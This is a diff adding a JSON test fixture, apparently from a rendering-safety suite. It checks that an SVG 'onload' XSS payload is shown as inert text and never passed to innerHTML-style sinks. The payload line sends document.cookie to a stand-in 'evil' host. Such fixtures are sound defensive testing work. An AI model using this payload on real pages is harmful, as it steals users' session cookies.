@@ -1,0 +1,11 @@
+{
+  "id": "render-xss-svg-onload-004",
+  "category": "render",
+  "vector": "svg_onload",
+  "payload": "<svg onload=\"new Image().src='http://evil/x?'+document.cookie\">",
+  "expectation": {
+    "render_contract": "text_content_only",
+    "inert_as_text": true,
+    "forbidden_html_sinks": ["innerHTML", "outerHTML", "insertAdjacentHTML"]
+  }
+}
